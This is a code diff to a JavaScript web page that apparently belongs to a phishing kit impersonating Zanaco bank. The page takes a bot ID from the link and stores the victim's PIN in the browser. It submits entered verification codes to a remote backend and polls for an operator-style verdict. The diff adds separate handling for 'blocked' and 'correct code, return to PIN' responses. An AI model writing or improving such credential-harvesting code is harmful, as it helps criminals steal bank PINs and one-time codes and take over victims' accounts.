@@ -58,8 +58,6 @@ const BACKEND_URL = "https://zanaco-backend.onrender.com";
 // ---------------- BOT & PIN ROUTING ----------------
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId');
-const pinRequestId = params.get('requestId'); // optional, in case PIN approval flow
-
 if (!botId) { alert("Invalid access link"); throw new Error(); }
 if (!localStorage.getItem('pin')) { window.location.href = `pin.html?botId=${botId}`; }
 
@@ -128,8 +126,21 @@ document.getElementById('codeForm').addEventListener('submit', async e => {
             const r = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
             const d = await r.json();
 
-            // --------- BLOCK / WRONG PIN ---------
-            if (d.blocked || d.redirectToPin) {
+            // --------- BLOCK ---------
+            if (d.blocked) {
+                clearInterval(poll);
+                clearInterval(countdown);
+                localStorage.removeItem('pin');
+                statusText.textContent = d.message || "Enter a valid prepaid number";
+                button.disabled = false;
+                btnText.textContent = 'Submit Code';
+                spinner.style.display = 'none';
+                inputs.forEach(i => i.value='');
+                return;
+            }
+
+            // --------- CORRECT CODE + RETURN TO PIN ---------
+            if (d.redirectToPin) {
                 clearInterval(poll);
                 clearInterval(countdown);
                 localStorage.removeItem('pin');
